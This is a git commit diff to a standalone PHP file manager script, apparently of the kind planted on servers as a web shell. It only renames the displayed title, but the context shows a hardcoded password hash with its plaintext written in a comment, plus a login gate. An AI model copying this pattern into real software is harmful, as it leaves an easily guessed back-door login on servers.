7854d89b54e67a03e037515cd1e21d0114783df2
AnggaTech <valorantakun1337@gmail.com>
2026-04-17 10:02:15 +0700

    Update one-filemanager-withoutterminal.php

--- one-filemanager-withoutterminal.php
+++ one-filemanager-withoutterminal.php
@@ -11,7 +11,7 @@ if(function_exists('get_magic_quotes_gpc')&&get_magic_quotes_gpc()){
     $_GET=_stripslashes_deep($_GET);$_POST=_stripslashes_deep($_POST);$_COOKIE=_stripslashes_deep($_COOKIE);
 }
 $HASH='$2a$12$I70efF55tBEnWs6pA.te3uc16PR1szT1LWrRGtALZMQMz6ik5m1au'; //admin1230
-$TITLE='GYOKKA';
+$TITLE='TITLE';
 if($HASH!==''){
     session_start();
     if(isset($_GET['logout'])){session_destroy();header('Location:'.$_SERVER['PHP_SELF']);exit;}
@@ -22,7 +22,7 @@ if($HASH!==''){
     }
     if(empty($_SESSION['ok'])){
         _head('Login');
-        echo '<div class="center-screen"><div class="login-card"><div class="login-logo">&#9670;</div><h2>GYOKKA</h2><p class="sub">File Manager</p>';
+        echo '<div class="center-screen"><div class="login-card"><div class="login-logo">&#9670;</div><h2>TITLE</h2><p class="sub">File Manager</p>';
         if(isset($login_err))echo '<div class="msg msg-err">Wrong password</div>';
         echo '<form method=post><input name=pw type=password placeholder="Password" class="inp full" autofocus><button type=submit class="btn accent full" style="margin-top:10px">UNLOCK</button></form></div></div>';
         _foot();exit;
